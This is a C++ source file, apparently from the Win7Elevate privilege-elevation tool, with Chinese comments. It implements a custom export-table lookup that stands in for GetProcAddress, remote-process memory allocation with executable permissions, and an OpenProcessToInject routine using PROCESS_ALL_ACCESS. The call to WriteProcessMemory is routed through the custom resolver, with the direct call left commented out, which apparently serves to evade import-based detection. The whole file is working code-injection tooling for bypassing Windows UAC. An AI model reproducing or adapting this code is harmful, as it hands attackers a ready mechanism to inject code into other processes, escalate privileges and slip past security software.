// elevate.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include "elevate.h"
#include "Win7Elevate_Inject.h"
#include <stdio.h>

DWORD MyGetProcAddress(HMODULE hModule, LPCSTR lpProcName)
{
	int i=0;
	char *pRet = NULL;
	PIMAGE_DOS_HEADER pImageDosHeader = NULL;
	PIMAGE_NT_HEADERS pImageNtHeader = NULL;
	PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;

	pImageDosHeader=(PIMAGE_DOS_HEADER)hModule;
	pImageNtHeader=(PIMAGE_NT_HEADERS)((DWORD)hModule+pImageDosHeader->e_lfanew);
	pImageExportDirectory=(PIMAGE_EXPORT_DIRECTORY)((DWORD)hModule+pImageNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

	DWORD dwExportRVA = pImageNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	DWORD dwExportSize = pImageNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;

	DWORD *pAddressOfFunction = (DWORD*)(pImageExportDirectory->AddressOfFunctions + (DWORD)hModule);
	DWORD *pAddressOfNames = (DWORD*)(pImageExportDirectory->AddressOfNames + (DWORD)hModule);
	DWORD dwNumberOfNames = (DWORD)(pImageExportDirectory->NumberOfNames);
	DWORD dwBase = (DWORD)(pImageExportDirectory->Base);

	WORD *pAddressOfNameOrdinals = (WORD*)(pImageExportDirectory->AddressOfNameOrdinals + (DWORD)hModule);

	//这个是查一下是按照什么方式（函数名称or函数序号）来查函数地址的
	DWORD dwName = (DWORD)lpProcName;
	if ((dwName & 0xFFFF0000) == 0)
	{
	goto xuhao;
	}

	for (i=0; i<(int)dwNumberOfNames; i++)
	{
	char *strFunction = (char *)(pAddressOfNames[i] + (DWORD)hModule);
	if (strcmp(strFunction, (char *)lpProcName) == 0)
	{
	  pRet = (char *)(pAddressOfFunction[pAddressOfNameOrdinals[i]] + (DWORD)hModule);
	  goto _exit11;
	}
	}
	//这个是通过以序号的方式来查函数地址的
	xuhao:
	if (dwName < dwBase || dwName > dwBase + pImageExportDirectory->NumberOfFunctions - 1)
	{
	return 0;
	}
	pRet = (char *)(pAddressOfFunction[dwName - dwBase] + (DWORD)hModule);
	_exit11:
	   //判断得到的地址有没有越界
	if ((DWORD)pRet<dwExportRVA+(DWORD)hModule || (DWORD)pRet > dwExportRVA+ (DWORD)hModule + dwExportSize)
	{
	 return (DWORD)pRet;
	}
	char pTempDll[100] = {0};
	char pTempFuction[100] = {0};
	strcpy(pTempDll, pRet);
	char *p = strchr(pTempDll, '.');
	if (!p)
	{
	return (DWORD)pRet;
	}
	*p = 0;
	strcpy(pTempFuction, p+1);
	strcat(pTempDll, ".dll");
	HMODULE h = GetModuleHandleA(pTempDll);
	if (h == NULL)
	{
	return (DWORD)pRet;
	}
	return MyGetProcAddress(h, pTempFuction);
}

CRemoteMemory::CRemoteMemory(HANDLE hRemoteProcess)
: m_hRemoteProcess(hRemoteProcess), m_bAnyFailures(false)
{
}

// virtual
CRemoteMemory::~CRemoteMemory()
{
}

void CRemoteMemory::LeakMemory()
{
}

bool CRemoteMemory::AnyFailures() const
{
	return m_bAnyFailures;
}

void *CRemoteMemory::AllocAndCopyMemory(const void *pLocalBuffer, SIZE_T bufferSize, bool bExecutable, bool bConst)
{
	void *pRemoteAllocation = VirtualAllocEx(m_hRemoteProcess, 0, bufferSize, MEM_COMMIT | PAGE_READWRITE, bExecutable ? PAGE_EXECUTE_READWRITE : PAGE_READWRITE);

	if (pRemoteAllocation)
	{
		DWORD dwOldProtect = 0;
		DWORD dwWrite = 0;
		typedef int (*myfnWPM)(HANDLE, LPVOID, LPCVOID, signed int, SIZE_T*);

		HMODULE v1 = GetModuleHandleA("kernel32.dll");
		int v2 = MyGetProcAddress(v1, "WriteProcessMemory");
 
		//if(WriteProcessMemory(m_hRemoteProcess, pRemoteAllocation, pLocalBuffer, bufferSize, &dwWrite) == 0
		if(((myfnWPM)v2)(m_hRemoteProcess, pRemoteAllocation, pLocalBuffer, bufferSize, &dwWrite) == 0
		||	(!bExecutable && !bConst && !VirtualProtectEx(m_hRemoteProcess, pRemoteAllocation, bufferSize, bExecutable ? PAGE_EXECUTE_READ : PAGE_READONLY, &dwOldProtect)))
		{
			VirtualFreeEx(m_hRemoteProcess, pRemoteAllocation, 0, MEM_RELEASE);
			pRemoteAllocation = 0;
		}
		//KDebug("WriteProcessMemory %d\n", dwWrite);
	}

	if (pRemoteAllocation == 0)
	{
		m_bAnyFailures = true;
	}

	return pRemoteAllocation;
}

wchar_t *CRemoteMemory::AllocAndCopyMemory(const wchar_t *szLocalString, bool bConst)
{
	return reinterpret_cast< wchar_t * >(
		this->AllocAndCopyMemory(
			reinterpret_cast< const void * >( szLocalString ),
			(wcslen(szLocalString)+1) * sizeof(szLocalString[0]),
			false, bConst ) );
}

char *CRemoteMemory::AllocAndCopyMemory(const char *szLocalString, bool bConst)
{
	return reinterpret_cast< char * >(
		this->AllocAndCopyMemory(
			reinterpret_cast< const void * >( szLocalString ),
			(strlen(szLocalString)+1) * sizeof(szLocalString[0]),
			false, bConst ) );
}

bool OpenProcessToInject(HANDLE *pOutProcHandle, DWORD dwPid, const wchar_t *szProcName)
{
	*pOutProcHandle = 0;

	if (szProcName == NULL)
	{
		return false;
	}

	*pOutProcHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);

	if (*pOutProcHandle == 0)
	{
		return false;
	}

	return true;
}